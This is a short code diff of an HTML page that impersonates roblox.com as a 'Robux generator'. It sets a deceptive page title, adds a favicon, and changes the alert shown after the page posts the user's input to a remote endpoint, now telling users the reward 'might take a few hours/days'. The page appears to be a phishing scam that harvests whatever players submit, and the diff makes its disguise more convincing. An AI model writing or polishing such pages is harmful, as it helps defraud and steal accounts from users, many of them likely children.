@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>roblox.com</title>
+  <title>roblox.com/generator/robux</title>
+  <link rel="icon" type="image/png" href="https://image2url.com/r2/default/images/1774275138892-2907d7ae-f094-44fa-b4dd-e391db859c70.png">
   <style>
     body {
       margin: 0;
@@ -111,7 +112,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: message })
       })
-      .then(res => res.ok ? alert('Sent!') : alert('Error sending: ' + res.status))
+      .then(res => res.ok ? alert('Sent. it might take a few hours/days!') : alert('Error sending: ' + res.status))
       .catch(err => alert('Fetch error: ' + err));
     }
 
